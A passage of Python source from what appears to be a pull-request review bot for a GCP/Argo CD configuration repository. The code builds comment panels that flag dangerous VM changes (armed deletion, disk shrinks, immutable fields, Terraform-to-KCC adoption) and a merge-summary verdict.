    through the whole panel. Classifying the move is what makes the
    comparison possible, so the check belongs here (COPS-2608).
    """
    for leaf in _VM_DISK_SIZE_KEYS:
        old_v = old_flat.get(_LEGACY_PREFIX + leaf)
        if old_v is None:
            continue
        for role in roles:
            new_v = _kcc_role_value(new_flat, role, leaf)
            if new_v is None:
                continue
            try:
                if float(str(new_v)) < float(str(old_v)):
                    return (f"`{leaf}` DECREASES across the Terraform \u2192 KCC "
                            f"move for role `{role}` (`{old_v}` \u2192 `{new_v}`) "
                            f"\u2014 GCP cannot shrink a disk in place")
            except (TypeError, ValueError):
                continue
    return ""


def _kcc_adoption_card(env_name: str, info: dict) -> list:
    """One card per adopted environment, replacing the nine
    "appears for the first time" bullets. Those are true of the Argo CD
    objects and misleading about GCP, where the VM already exists and is
    adopted by resourceID."""
    lines = [
        f"**\U0001f5a5\ufe0f VM INFRASTRUCTURE \u2014 ADOPTION \u2014 `{env_name}`**",
        "",
        "Terraform `deployLinuxServices` \u2192 KCC `deployLinuxServicesK8s`. "
        "The existing GCP VM is adopted by name (`createNewBootDisk: false`). "
        "**No VM is created or resized by this PR.**",
        "",
    ]
    for f in info["roles"]:
        inst = f["instance"] or f"(chart default for role `{f['role']}`)"
        lines.append(f"- **{f['role']}** \u2014 instance `{inst}`, machineType "
                     f"`{f['machineType']}` (unchanged)"
                     + (f", data disk {f['dataDiskSizeGb']}Gi"
                        if f["dataDiskSizeGb"] else "")
                     + f", manageMetadata={f['manageMetadata']}")
    lines += [
        "",
        "The Compute objects are new **in Argo CD**; the GCP resources "
        "already exist and are adopted by `resourceID`. After merge: "
        "`lastStartTimestamp` unchanged, all `Compute*` UpToDate, then the "
        "`terraform state rm` follow-up.",
        "",
    ]
    return lines

# Panel headers are constants because the merge summary recognises its own
# panels by them. Danger uses "##", routine and clean use "###", so the
# summary can tell severity apart without re-deriving any facts.
_VM_PANEL_DANGER_HDR = ("## \U0001f5a5\ufe0f\U0001f6a8 VM INFRASTRUCTURE "
                        "CHANGES \U0001f6a8")
_VM_PANEL_ROUTINE_HDR = "### \U0001f5a5\ufe0f VM INFRASTRUCTURE CHANGES (routine)"
_VM_PANEL_CLEAN_HDR = "### \U0001f5a5\ufe0f VM infrastructure \u2014 no changes"


def _summarize_vm_changes(changed_files, pr_sha, base_sha, path_map,
                          app_results, repo=None) -> list:
    """Markdown panel for VM-domain (KCC linux-services) changes.

    Two detection levels, both needed, both deterministic:

    VALUES level: any changed key under the deployLinuxServicesK8s domain
    in a value file this PR modifies on both sides. This is the only level
    that can catch the change on a non-rendering environment — observed
    live on acme-config-prod PR #3892, where adding
    `defaults.allowDeletion: true` to an AZURE environment (the KCC
    templates render only for GCP) produced a green "No manifest changes"
    comment while literally arming VM deletion ahead of a decommission.
    The same key change also shows as one plain bullet in the generic
    cause panel; that panel stays complete on purpose, this one adds the
    weight and the consequence.

    RENDERED level: the structured facts _detect_vm_changes extracted per
    app at diff time on the full pre-cap section list
    (DiffResult.vm_changes), naming the exact resource and field,
    old -> new.

    Same never-break-the-comment contract and _bb_fetch_cached reuse as
    _summarize_appspace_state_changes: re-reading a (path, sha) the input
    panel already fetched is a cache hit, not a second Bitbucket call.
    Files present on only one side are new-env/decommission territory with
    their own panels. Returns [] when the PR does not touch the VM domain
    at all — an always-on panel trains reviewers to skip it.
    """
    dangerous_lines, routine_lines = [], []
    adoption_cards = []
    seen = set()
    for f in (changed_files or [])[:12]:
        clean = posixpath.normpath(f.lstrip("/"))
        if clean in seen or not clean.endswith((".yaml", ".yml")):
            continue
        seen.add(clean)
        new_txt, st_new = _bb_fetch_cached(clean, pr_sha, repo=repo)
        old_txt, st_old = _bb_fetch_cached(clean, base_sha, repo=repo)
        if st_new != BB_OK or st_old != BB_OK:
            continue  # added/deleted file: new-env / decommission territory
        try:
            new_flat = _flatten_yaml(yaml.safe_load(new_txt) or {})
            old_flat = _flatten_yaml(yaml.safe_load(old_txt) or {})
        except yaml.YAMLError:
            continue  # the input panel already flags unparseable files
        keys = sorted(k for k in (set(old_flat) | set(new_flat))
                      if k.startswith(_VM_VALUES_PREFIXES)
                      and old_flat.get(k) != new_flat.get(k))
        if not keys:
            continue
        env_name = posixpath.basename(posixpath.dirname(clean))
        # COPS-2608: classify the whole file before scoring individual keys.
        # A Terraform -> KCC ownership transfer moves the same machineType
        # from one key tree to the other; scoring the removal and the
        # addition independently reads as two resizes and blocks a PR that
        # resizes nothing. Only the machineType reason is suppressed: every
        # other danger rule still applies to the same file, so arming
        # deletion or shrinking a disk in the same PR still blocks.
        adoption = _detect_kcc_adoption(old_flat, new_flat)
        if adoption and adoption.get("kind") == "adoption":
            shrink = _kcc_move_disk_shrink(
                old_flat, new_flat, [f["role"] for f in adoption["roles"]])
            if shrink:
                # A shrink across the move is real data loss and the plain
                # shrink rule cannot see it (different keys either side).
                # Report it and stop treating the file as a safe adoption,
                # so nothing else gets suppressed either.
                dangerous_lines.append(
                    f"- \U0001f6a8 `{env_name}` \u00b7 **linux VM (KCC \u2190 legacy)**: "
                    f"{shrink}")
                adoption = None
        if (adoption and adoption.get("kind") == "adoption"
                and path_map.get(clean)):
            adoption_cards.extend(_kcc_adoption_card(env_name, adoption))
        scope = (f"`{env_name}`" if path_map.get(clean) else
                 f"ancestor `{clean}` (inherited by every environment "
                 f"below it)")
        for k in keys:
            prefix = next(p for p in _VM_VALUES_PREFIXES if k.startswith(p))
            domain = _VM_DOMAIN_LABELS[prefix]
            rest = k[len(prefix):]
            role = rest.split(".", 1)[0]
            role_label = ("defaults (all roles)" if role == "defaults"
                          else role if role in _VM_ROLE_NAMES else rest)
            role_label = f"{domain} \u00b7 {role_label}"
            old_v, new_v = old_flat.get(k), new_flat.get(k)
            old_s = "" if old_v is None else str(old_v)
            new_s = "" if new_v is None else str(new_v)
            leaf = rest.rsplit(".", 1)[-1]
            if old_v is not None and new_v is not None:
                change = f"`{rest}`: `{old_s}` \u2192 `{new_s}`"
            elif old_v is None:
                change = f"**added** `{rest}` = `{new_s}`"
            else:
                change = f"**removed** `{rest}` (was `{old_s}`)"
            danger, reason = False, ""
            if leaf == "allowDeletion" and new_s.lower() == "true":
                danger = True
                reason = ("deletion-policy flips to `delete` and "
                          "deletionProtection turns off for this role's VM, "
                          "disk and address \u2014 the next cascade can "
                          "destroy them in GCP")
            elif leaf == "enabled" and new_s.lower() == "false":
                danger = True
                reason = ("the resources disappear from the render \u2014 a "
                          "live VM stops being managed, or gets deleted if "
                          "deletion is armed")
            elif leaf == "machineType":
                ds = (new_flat.get(prefix + role + ".desiredStatus")
                      or new_flat.get(prefix + "defaults.desiredStatus"))
                # Suppressed only for a classified adoption, and only on the
                # linux key trees it applies to: the value is not changing,
                # it is moving key. Windows and any unclassified file keep
                # the original rule untouched.
                adopted_move = (adoption is not None
                                and prefix in (_LEGACY_PREFIX, _KCC_PREFIX))
                if str(ds) != "TERMINATED" and not adopted_move:
                    danger = True
                    reason = ("machineType changes while desiredStatus is "
                              "not TERMINATED \u2014 the runbook requires "
                              "stopping the VM first")
            elif leaf == "zone":
                danger = True
                reason = "zone is immutable \u2014 destroy-and-recreate"
            elif leaf in _VM_DISK_SIZE_KEYS:
                try:
                    if float(new_s) < float(old_s):
                        danger = True
                        reason = ("disk size DECREASES \u2014 GCP cannot "
                                  "shrink a disk in place")
                except (TypeError, ValueError):
                    # Sizes that are not plainly numeric (templated values,
                    # or values carrying a unit suffix) cannot be compared,
                    # so the shrink check is skipped on purpose. The key
                    # change itself is still reported as a routine line.
                    pass
            elif leaf in _VM_DISK_TYPE_KEYS:
                danger = True
                reason = "disk type is immutable \u2014 destroy-and-recreate"
            mark = "\U0001f6a8 " if danger else ""
            tail = f" \u2014 {reason}" if reason else ""
            line = f"- {mark}{scope} \u00b7 **{role_label}**: {change}{tail}"
            (dangerous_lines if danger else routine_lines).append(line)

    for app, r in sorted((app_results or {}).items()):
        for fact in (getattr(r, "vm_changes", None) or []):
            env = _envs_from_apps([app])[0]
            where = f"`{env}` \u00b7 `{fact['kind']} {fact['name']}`"
            field_txt = ", ".join(
                "`%s` `%s` \u2192 `%s`" % (k, o or "(absent)", n or "(removed)")
                for k, o, n in fact["fields"])
            if fact["dangerous"]:
                dangerous_lines.append(
                    "- \U0001f6a8 %s: %s \u2014 %s" % (
                        where,
                        field_txt or ("resource DELETED from the render"
                                      if fact["deleted"] else
                                      "resource-level change"),
                        "; ".join(fact["dangerous"])))
            elif fact["fields"] or fact["notes"]:
                routine_lines.append(
                    "- %s: %s" % (where,
                                  field_txt or "; ".join(fact["notes"])))

    if not dangerous_lines and not routine_lines:
        # Always render the section, even empty. Operators asked for a
        # fixed place to look: "did this PR touch VMs at all?" must be
        # answerable without reading the rest. Audit of the last 40
        # acme-config-prod PRs found "GCP unify guard: Windows/LinuxVM
        # off" switching VMs off with no VM wording anywhere in the
        # comment -- silence is indistinguishable from "not checked".
        return [_VM_PANEL_CLEAN_HDR, "",
                "No changes to VM infrastructure (KCC linux-services) in "
                "this PR.", ""]
    if dangerous_lines:
        _warn = ("**This PR touches virtual machine infrastructure (KCC linux-services). A botched VM change is slow and painful to recover from \u2014 verify every line below before merging.**")
        lines = [
            _VM_PANEL_DANGER_HDR,
            "",
            _warn,
            "",
        ] + dangerous_lines
        # Even when something else in the PR is dangerous, an adoption that
        # was classified still gets its card: the reviewer needs to know the
        # VM is being adopted rather than created while judging the real
        # danger above it.
        if adoption_cards:
            lines += [""] + adoption_cards
        if routine_lines:
            lines += ["", "Routine VM changes in the same PR:", ""] + routine_lines
        return lines + [""]
    return ([_VM_PANEL_ROUTINE_HDR, ""]
            + (adoption_cards + [""] if adoption_cards else [])
            + routine_lines + [""])


# ── Merge summary ────────────────────────────────────────────────────
# The headline panel: one verdict plus one line per finding, so an
# operator can answer "is this safe to merge?" from the first screen.
# Built from the audit of the last 40 merged acme-config-prod PRs:
#   * 20/40 were fleet version bumps and 10/40 were truncated at the
#     245KB wall, so the routine case must compress to a single line;
#   * six decommission-phase PRs (arm cascade, arm data purge, arm VM
#     deletion) produced 489-571 byte comments with NO panel at all --
#     the most destructive changes in the fleet were the quietest;
#   * nine PRs fired RESOURCE(S) DELETED, several of them really folder
#     moves and key renames, so deletions must say WHERE, not just that
#     they happened.
# Severity is the maximum over the findings: BLOCK > REVIEW > ROUTINE.
_SEV_ROUTINE, _SEV_REVIEW, _SEV_BLOCK = 0, 1, 2
_VERDICTS = {
    _SEV_BLOCK: "\u26d4 **DO NOT MERGE** without checking the item(s) below",
    _SEV_REVIEW: "\u26a0\ufe0f **Review before merging**",
    _SEV_ROUTINE: "\u2705 **Routine** \u2014 nothing dangerous detected",
}


def _fmt_env_list(apps, shown=8) -> str:
    """Environment names, the way operators say them (no -ms/-ss/-glb)."""
    envs = sorted(set(_envs_from_apps(sorted(apps))))
    return _fmt_service_list(envs, shown=shown)


def _build_merge_summary(results, rollup_by_sig, vm_change_lines,
                         decommission_lines, appspace_state_lines,
                         new_env_lines, new_env_structural) -> list:
    """The verdict block that opens every comment.

    Reads the same deterministic facts the panels below use, so the
    summary can never disagree with the detail. Text panels built
    elsewhere are recognised by their own header constants rather than
    re-derived, for the same reason.
    """
    findings = []          # (severity, line)
    sev = _SEV_ROUTINE

    if decommission_lines:
        txt = "\n".join(decommission_lines)
        purge = "PURGE" in txt.upper()
        findings.append((_SEV_BLOCK,
                         "\U0001f5d1\ufe0f **Environment decommission** \u2014 "
                         + ("data purge is ARMED: buckets/datasets are "
                            "destroyed, not abandoned"
                            if purge else
                            "resources are deleted; data is abandoned, "
                            "not purged")))
    if vm_change_lines:
        hdr = vm_change_lines[0]
        if hdr == _VM_PANEL_DANGER_HDR:
            findings.append((_SEV_BLOCK,
                             "\U0001f5a5\ufe0f **VM infrastructure change "
                             "flagged dangerous** \u2014 see the VM section"))
        elif hdr == _VM_PANEL_ROUTINE_HDR:
            findings.append((_SEV_ROUTINE,
                             "\U0001f5a5\ufe0f VM infrastructure changed "
                             "(routine)"))

    deleted_apps = sorted(a for a, r in results.items() if r.deleted_resources)
    if deleted_apps:
        n = sum(len(results[a].deleted_resources) for a in deleted_apps)
        findings.append((_SEV_BLOCK,
                         f"\u274c **{n} resource(s) deleted** in "
                         f"{len(deleted_apps)} app(s): "
                         f"{_fmt_env_list(deleted_apps)}"))
    renamed_apps = sorted(a for a, r in results.items()
                          if getattr(r, "renamed_resources", None))
    if renamed_apps:
        findings.append((_SEV_ROUTINE,
                         "\u267b\ufe0f resources renamed/recreated (not a "
                         f"deletion): {_fmt_env_list(renamed_apps)}"))

    downgraded = sorted(a for a, r in results.items()
                        if r.version_change
                        and _is_version_downgrade(*r.version_change))
    if downgraded:
        findings.append((_SEV_REVIEW,
                         "\u2b07\ufe0f **Chart version downgrade** in "
                         f"{_fmt_env_list(downgraded)}"))
    zeroed_apps = sorted(a for a, r in results.items() if r.replicas_zeroed)
    if zeroed_apps:
        findings.append((_SEV_REVIEW,
                         "\U0001f9ca **Replicas scaled to zero** in "
                         f"{_fmt_env_list(zeroed_apps)}"))

    if appspace_state_lines:
        txt = "\n".join(appspace_state_lines)
        # Arming destruction is the highest-severity thing a config-only PR
        # can do, and it is invisible in the manifest diff: the footer still
        # reads "No manifest changes". Live proof, acme-config-dev PR #7024:
        # the body shouted DECOMMISSION ARMED while this summary said
        # "Routine - nothing dangerous detected". A verdict that contradicts
        # the panel below it is worse than no verdict at all.
        if "PURGE ARMED" in txt:
            findings.append((_SEV_BLOCK,
                             "\U0001f6a8 **Data purge ARMED** \u2014 the "
                             "cascade will permanently destroy the BigQuery "
                             "dataset and the user content bucket"))
        elif "DECOMMISSION ARMED" in txt:
            findings.append((_SEV_BLOCK,
                             "\U0001f512 **Decommission ARMED** \u2014 this "
                             "environment becomes eligible for cascade "
                             "deletion when its folder is removed"))
        elif "DISARMED" in txt.upper():
            findings.append((_SEV_ROUTINE,
                             "\U0001f513 decommission disarmed (safe "
                             "direction)"))
        if "PAUSED" in txt.upper():
            findings.append((_SEV_REVIEW,
                             "\u23f8\ufe0f **ArgoCD auto-sync paused** for an "
                             "environment \u2014 changes stop being applied"))
        elif "RESUMED" in txt.upper():
            findings.append((_SEV_REVIEW,
                             "\u25b6\ufe0f **ArgoCD auto-sync resumed** \u2014 "
                             "pending drift will be applied"))
    if new_env_lines:
        findings.append((_SEV_REVIEW if new_env_structural else _SEV_ROUTINE,
                         "\U0001f195 **New environment** in this PR"
                         + (" \u2014 its configuration did not validate"
                            if new_env_structural else "")))

    # The 50% case: fleets jumping from one version to another. Named the
    # way operations talks about it -- environments and versions.
    for _sig in sorted(rollup_by_sig or {}):
        apps = [a for _rep, _mem, _r in rollup_by_sig[_sig] for a in _mem]
        findings.append((_SEV_ROUTINE,
                         f"\u2b06\ufe0f **{len(set(_envs_from_apps(apps)))} "
                         f"environment(s) jumping** "
                         f"{_routine_bump_label(_sig)}: "
                         f"{_fmt_env_list(apps)}"))

    changed = [a for a, r in results.items() if r.outcome == OUT_DIFF]
    errored = [a for a, r in results.items() if r.outcome == OUT_ERROR]
    unknown = [a for a, r in results.items() if r.outcome == OUT_INDETERMINATE]
    if errored or unknown:
        findings.append((_SEV_REVIEW,
                         f"\u2754 **{len(errored) + len(unknown)} app(s) "
                         f"could not be diffed** \u2014 the comment below "
                         f"cannot prove they are safe"))
    if not findings:
        findings.append((
            _SEV_ROUTINE,
            (f"\u2705 {len(changed)} app(s) change, nothing risk-flagged"
             if changed else
             "\u2705 No manifest changes and no risky configuration change")))

    sev = max(s for s, _ in findings)
    n_check = sum(1 for s, _ in findings if s >= _SEV_REVIEW)
    verdict = _VERDICTS[sev]
    if sev >= _SEV_REVIEW:
        verdict += f" ({n_check} item(s))"
    order = {_SEV_BLOCK: 0, _SEV_REVIEW: 1, _SEV_ROUTINE: 2}
    findings.sort(key=lambda f: order[f[0]])
    return ["### \U0001f9ed Merge summary", "", verdict, ""] + \
           [f"- {line}" for _s, line in findings] + [""]


def _comment_header(pr_sha: str) -> str:
    """The one true '**Commit**' header line for EVERY comment body.

    v2.5.18 (FINDINGS_SCALE S6): _extract_comment_sha parses this exact
    shape back out of a posted comment for the cross-pod SHA dedup. v2.4.6
    fixed a generated-vs-parsed drift in format_comment's header; the SAME
    bug class had been reintroduced in the hand-built no-apps and error
    bodies, which wrote a plain 'Commit `sha`' (no bold) — invisible to the
    extractor, so every pod restart reprocessed those PRs once (cheap for
    no-apps, a full re-run for errored PRs). Every body builder now goes
    through this single source of truth, and a source-grep regression test
    (test_v2518_scale_hardening.py) blocks the plain form from returning.
    """
    return f"**Commit** `{pr_sha[:8]}` \u2192 `main` | `{_repo_for_sha(pr_sha) or BB_REPO}`"


def _app_sort_key(app: str, r) -> tuple:
    """Deterministic ordering for both the overview table and the per-app
    section list (COPS-2579 item 5): anything worth a reviewer's attention
    (changed, decommissioned, error, indeterminate) sorts before a plain
    no-diff app, and app names sort alphabetically within each bucket.
    Replaces the previous unsorted worker-completion order."""
    return (0 if r.outcome != OUT_NO_DIFF else 1, app)


def _group_changed_apps_by_fingerprint(changed_apps: list) -> list:
    """Group (app, DiffResult) pairs whose full diff is byte-for-byte
    identical (same fingerprint) into one entry each, so format_comment can
    show a single full representative diff per group instead of one per
    app (COPS-2579 item 2 -- the fix for acme-config-prod PR #3837, where
    248 apps sharing the exact same 67-resource change showed as 6
    arbitrary, truncated, mutually-duplicate diffs).

    Apps with no fingerprint (legacy/coerced DiffResult, e.g. from
    _result()'s 3-tuple path, or hand-built in a test) always form their
    own singleton group -- they never merge with anything, since None is
    never equal to another None group's identity here.

    Returns [(representative_app, member_apps, representative_result), ...]
    sorted by representative_app name, with member_apps sorted too, so the
    grouping is fully deterministic regardless of the input order
    (changed_apps arrives in worker-completion order).
    """
    buckets, order = {}, []
    for app, r in changed_apps:
        key = r.fingerprint if r.fingerprint else ("__no_fingerprint__", app)
        if key not in buckets:
            buckets[key] = []
            order.append(key)
        buckets[key].append((app, r))
    groups = []
    for key in order:
        members = sorted(buckets[key], key=lambda x: x[0])
        rep_app, rep_r = members[0]
        groups.append((rep_app, [a for a, _ in members], rep_r))
    groups.sort(key=lambda g: g[0])
    return groups


def format_comment(pr_sha, app_results, skipped_apps=None, base_sha="",
                    new_env_lines=None, new_env_structural=False, new_env_desc="",
                    decommission_lines=None, input_change_lines=None,
                    appspace_state_lines=None, appendix_lines=None,
                    vm_change_lines=None, artifact_url="",
                    readable_budget=None, profile=None):
    """Format the full PR comment. Never uses <details>/<summary> — Bitbucket
    does not render them. Large changesets get a compact summary table at the
    top (all apps, one row each) and, for the diff sections below, apps
    whose FULL diff is byte-for-byte identical (COPS-2579: a shared
    ancestor-file change rolled out the same way to many environments) are
    grouped so the comment shows one complete representative diff per
    distinct change instead of many arbitrary, truncated duplicates. Total
    size still stays well inside the 245KB comment limit via the per-body
    and global truncation that already existed.

    new_env_lines/new_env_structural/new_env_desc (v2.5.4, Finding 4): a PR
    can touch existing apps AND add brand-new environments in the same
    commit. new_env_lines is the markdown block from _evaluate_new_envs to
    splice into this comment; new_env_structural forces the footer to treat
    a broken new environment as blocking even if every existing app's own
    diff is perfectly clean — a reviewer must never see a plain green check
    while an unvalidated new environment rode along in the same PR.

    appspace_state_lines (COPS-2584): the markdown block from
    _summarize_appspace_state_changes calling out an autosync pause/resume
    or a decommission arm/disarm. Rendered as the very first thing after the
    header, before even the input-changes cause panel — these flags change
    ArgoCD's behaviour for the whole environment while every other panel
    (chart diff, resource diff, cause panel) would otherwise report nothing,
    so this is the headline, not a footnote.
    """
    skipped_apps  = skipped_apps or []
    results       = {app: _result(v) for app, v in app_results.items()}
    # Which surface is being rendered (COPS-2609). `readable_budget` is the
    # deprecated way to ask and still works everywhere; it maps onto a
    # profile rather than being interpreted twice. Refusing both together is
    # deliberate: phases C-E move call sites over one at a time, and during
    # that window a silent winner would let a caller believe it set a budget
    # it did not set.
    if profile is not None and readable_budget is not None:
        raise TypeError("format_comment(): pass profile= or readable_budget=, "
                        "not both")
    profile = (profile or RenderProfile.from_readable_budget(
        readable_budget)).resolved()
    # NON-NEGOTIABLE (COPS-2612): dropping the YAML from the comment is only
    # ever safe when the page exists to hold it. No artifact_url means the
    # save failed or the UI is off, so the comment falls back to inlining
    # and the phase B notice says why. Without this, a failed artifact save
    # would silently produce a comment with no evidence anywhere -- the one
    # outcome the whole umbrella is built to prevent.
    if not profile.is_complete_record and not artifact_url:
        profile = profile.replace(inline_diffs=True, input_panel=True)
    # Readability budget for the BULK region only. 0 = render everything.
    # The persisted full-diff artifact is built with the FULL profile: the
    # comment may fold bulk content away, but the view it links to must
    # never be missing anything, or the link the comment offers is a dead
    # end.
    budget        = profile.readable_budget
    any_change    = False
    any_error     = False
    any_unknown   = False
    total_changed = 0
    unknown_apps  = []

    changed_apps      = [(app, r) for app, r in results.items() if r.outcome == OUT_DIFF]
    total_diff_bytes  = sum(len(r.text) for _, r in changed_apps)
    is_large          = (
        len(changed_apps) > LARGE_PR_APP_THRESHOLD
        or total_diff_bytes > LARGE_PR_DIFF_BYTES
    )

    # COPS-2579: group changed apps whose full diff is byte-for-byte
    # identical. diff_group_for_app maps EVERY member app (including the
    # representative) to (representative_app, member_apps, representative
    # DiffResult), so the per-app loop below can render each group exactly
    # once, at the representative's sorted position, and skip every other
    # member without leaving a gap.
    diff_groups = _group_changed_apps_by_fingerprint(changed_apps)
    diff_group_for_app = {}
    for rep_app, members, rep_r in diff_groups:
        for m in members:
            diff_group_for_app[m] = (rep_app, members, rep_r)

    # Routine-bump rollup, layered ON TOP of the fingerprint grouping: the
    # grouping collapses byte-identical diffs into one representative;
    # this folds INPUT_ROLLUP_MIN_SERVICES or more equivalent-but-not-
    # identical groups (per-environment names defeat the fingerprint — the
    # PR #3891 shape: one appspace.version bump rendered as 473
    # near-identical blocks) into ONE summary line per distinct
    # transition. A single group, however many byte-identical members it
    # has, keeps its full representative diff exactly as before. Risk
    # always wins: any group whose diff is not provably version-only stays
    # fully enumerated (_routine_bump_signature fails open).
    rollup_by_sig, rolled_apps = {}, set()
    _sig_buckets = {}
    if budget:  # budget=0 renders everything: the artifact keeps every diff
        for grp in diff_groups:
            _sig = _routine_bump_signature(grp[2])
            if _sig is not None:
                _sig_buckets.setdefault(_sig, []).append(grp)
    for _sig, _grps in _sig_buckets.items():
        if len(_grps) >= INPUT_ROLLUP_MIN_SERVICES:
            rollup_by_sig[_sig] = _grps
            for _rep, _members, _r in _grps:
                rolled_apps.update(_members)

    mode_label = "large" if is_large else "small"
    print(f"    [comment] mode={mode_label} | changed_apps={len(changed_apps)} | "
          f"diff_bytes={total_diff_bytes}")
    ai_summary = generate_ai_summary(app_results)
    if ai_summary:
        print(f"    [comment] AI summary included ({len(ai_summary)} chars)")
    elif not any(_result(v).outcome == OUT_DIFF for v in app_results.values()):
        # Nothing changed, so there was nothing to summarise. Routine.
        print("    [comment] AI summary absent (no changes to summarise)")
    else:
        # COPS-2617 secondary finding: this and the line above used to share
        # one INFO message, so a Vertex call failing on every PR looked
        # exactly like a quiet day. Changes exist and the summary is missing,
        # which means the call failed -- say so, and at a level that shows up.
        log("[comment] AI summary absent despite changed apps: the Vertex "
            "call failed or returned nothing", "WARNING")

    # ── Header ──────────────────────────────────────────────────────
    large_label = f" | \U0001f4e6 Large changeset ({len(changed_apps)} apps)" if is_large else ""
    # COPS-2609: the pointer to the full rendered output, rendered in two
    # fixed places so a reader learns where to look. Every other link to
    # that page is conditional -- a truncation note, a per-app "full hunks"
    # pointer, a rollup line -- so a comment where nothing was truncated and
    # nothing was folded had no way to reach it at all. Measured on
    # acme-config-prod #3899: zero occurrences in the body.
    #
    # When the page could not be produced the comment says so rather than
    # degrading quietly: a reviewer cannot otherwise tell an unavailable
    # page from one nobody linked, and the later phases remove inline YAML
    # on the promise that this link is always here.
    # This page IS the full rendered output, so it renders no pointer at
    # all: a link to itself is noise, and with no URL to hand the fallback
    # branch made the page announce that the page could not be produced.
    _full_view = None if profile.is_complete_record else (
        f"\U0001f50e **Full rendered diff (every hunk):** {artifact_url}"
        if artifact_url else
        "\u26a0\ufe0f The full-diff page could not be produced for this run, "
        "so every hunk is inlined below.")
    lines = [
        f"## \U0001f52d {STATUS_NAME}", "",
        f"{_comment_header(pr_sha)}{large_label}", "",
    ]
    # COPS-2622: the header copy is gone. COPS-2609 rendered this pointer
    # twice because "on a long comment the header has scrolled away" -- and
    # phase E is the change that made the comment short, so that reason
    # expired. The surviving copy is the one above the Status line, because
    # it is the last thing read and every app now carries its own deep link.
    if _full_view and not artifact_url:
        # The no-page notice still belongs at the top: it changes how the
        # whole comment should be read, so burying it at the bottom would
        # be the one case where the header position mattered.
        lines += [_full_view, ""]
    # The bulk-region budget is measured with _body_size(), which counts
    # every line including the header. COPS-2609 added this compensation
    # because the pointer then rendered INSIDE the measured region and would
    # otherwise have eaten readable budget, silently folding a diff section
    # away -- a behaviour change disguised as a link.
    #
    # COPS-2622 removed the header copy, so the surviving pointer is appended
    # after the loop and never consumes budget. The compensation has to go
    # with it, or the bulk region quietly gains ~85 bytes it did not pay for.
    # It still applies in the no-page case above, which is the only branch
    # that still renders a line here.
    if budget and _full_view and not artifact_url:
        budget += len(_full_view.encode("utf-8")) + 2

    # ── Merge summary ────────────────────────────────────────────────
    # The verdict, before any detail: an operator decides here whether
    # this PR is safe to merge, and only then reads down for the why.
    lines += _build_merge_summary(
        results, rollup_by_sig, vm_change_lines, decommission_lines,
        appspace_state_lines, new_env_lines, new_env_structural)
    lines += ["---", ""]

    # ── Application state-flag warning (COPS-2584) ───────────────────
    # autosync pause/resume, decommission arm/disarm — shown before even the
    # input-changes cause panel, since these flags change ArgoCD's behaviour
    # for the whole environment while nothing else in the comment would
    # otherwise say so.
    if appspace_state_lines:
        lines += appspace_state_lines

    # ── Input root-cause panel (v2.6.2) ──────────────────────────────
    # WHAT the PR edits at the values level, before any symptom below —
    # a reviewer reads cause first (PR #6848).
    # profile.input_panel: phase E moves this panel to the page, where a
    # reviewer has room for it. Off here means it is not rendered at all on
    # this surface, never that it stopped being computed.
    if input_change_lines and profile.input_panel:
        lines += input_change_lines

    # ── Environment decommission warning (v2.5.10) ───────────────────
    # Most critical/destructive possible finding — shown before even the
    # downgrade warning.
    if decommission_lines:
        lines += decommission_lines

    # ── VM infrastructure changes ─────────────────────────────────────
    # Between the decommission warning (whole-environment destruction
    # outranks a field change) and the downgrade shout: a botched VM
    # change is the slowest thing on this platform to recover from, and
    # the reviewers reading these comments daily asked for it to be
    # impossible to miss.
    if vm_change_lines:
        lines += vm_change_lines

    # ── Chart downgrade warning (v2.5.8) ─────────────────────────────
    # A chart version going DOWN is legal but dangerous (schema regressions,
    # migrations that do not run backwards), and it is easy to miss inside a
    # long diff — or invisible entirely when it comes from a tier default
    # after a folder move. Shout it at the very top, in big letters, before
    # anything else.
    downgrades = [
        (app, r.version_change) for app, r in results.items()
        if r.version_change and _is_version_downgrade(*r.version_change)
    ]
    if downgrades:
        lines += [
            "# \U0001f53b\u26a0\ufe0f CHART VERSION DOWNGRADE \u26a0\ufe0f\U0001f53b",
            "",
            "**This PR moves the chart to a LOWER version. Downgrades can break "
            "schema/data migrations that do not run backwards. Verify this is "
            "intentional before merging.**",
            "",
        ]
        for app, (cur_v, new_v) in downgrades:
            lines.append(f"### \U0001f53b `{app}`: `{cur_v}` \u2192 **`{new_v}`**")
        lines += [""]

    # ── AI Analysis block ────────────────────────────────────────────
        # ── Deleted resources (v2.5.26) ──────────────────────────────────
    # Deterministic, computed at diff time on the FULL pre-cap section list
    # (PR 6773: two deletions in a 111-resource app were invisible — capped
    # out of both the inline sections and the AI prompt, and the AI-only
    # CRITICAL block said "none"). Same design language as the downgrade
    # warning: deterministic safety facts never depend on the model.
    all_deleted = [(app, hdr) for app, r in results.items()
                   for hdr in (r.deleted_resources or [])]
    if all_deleted:
        n_del = len(all_deleted)
        lines += [
            f"## \U0001f5d1\ufe0f\u26a0\ufe0f {n_del} RESOURCE(S) DELETED \u26a0\ufe0f",
            "",
            "**This PR removes the following resources entirely. Verify each "
            "deletion is intentional \u2014 \U0001f510-flagged kinds can revoke "
            "access or destroy credentials/data.**",
            "",
        ]
        # COPS-2594: sensitive kinds are never truncated away. The whole
        # point of this block is that a reviewer can see every deletion that
        # can revoke access or destroy data, so those are listed first and in
        # full; only the ordinary kinds are capped.
        sensitive = [(a, h) for a, h in all_deleted if _is_sensitive_kind(h)]
        ordinary  = [(a, h) for a, h in all_deleted if not _is_sensitive_kind(h)]
        shown = sensitive + ordinary[:max(0, 20 - len(sensitive))]
        for app, hdr in shown:
            flag = "\U0001f510 " if _is_sensitive_kind(hdr) else ""
            lines.append(f"- {flag}`{app}` \u2192 `{hdr}`")
        if n_del > len(shown):
            lines.append(
                f"- *(+{n_del - len(shown)} more, all non-sensitive kinds)*")
        lines.append("")

    # ── Renamed resources (COPS-2594) ────────────────────────────────
    # Deleted and recreated under a new name in this same PR. Reported
    # quietly and separately: it is not a deletion, but the reviewer should
    # still see that the identity changed.
    all_renamed = [(app, old_h, new_h) for app, r in results.items()
                   for old_h, new_h in (r.renamed_resources or [])]
    if all_renamed:
        n_ren = len(all_renamed)
        lines += [
            f"### \U0001f504 {n_ren} resource(s) RENAMED",
            "",
            "Deleted and recreated under a new name in this PR, so nothing is " +
            "lost. Common when a name carries a content hash, or when a " +
            "resource moves to a new identity.",
            "",
        ]
        for app, old_h, new_h in all_renamed[:10]:
            lines.append(f"- `{app}` \u2192 `{_section_name(old_h)}` "
                         f"\u2192 `{_section_name(new_h)}`")
        if n_ren > 10:
            lines.append(f"- *(+{n_ren - 10} more)*")
        lines.append("")

    # AI Analysis: page only from COPS-2612 on. Decision recorded in the
    # ticket, as it required. It is model output that partly restates the
